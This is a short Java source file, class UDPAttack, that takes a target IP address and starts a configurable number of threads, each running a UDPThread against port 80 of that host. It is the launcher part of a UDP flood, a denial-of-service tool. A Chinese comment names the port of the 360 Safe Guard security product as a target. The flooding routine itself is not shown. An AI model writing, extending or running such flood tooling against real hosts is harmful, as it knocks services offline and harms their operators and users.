package Test;

import java.net.*;
public class UDPAttack
{
 public String ip;
 public UDPThread ut;
 public UDPAttack(String ip)
 {
  this.ip=ip;
 }
 public void start() throws Exception
 {

  ut=new UDPThread(InetAddress.getByName(ip),80);//3600为360安全卫士的端口
  for(int i=1;i<=MainAwt.threadCount;i++)
  {
   new Thread(ut).start();
  }
 }
}
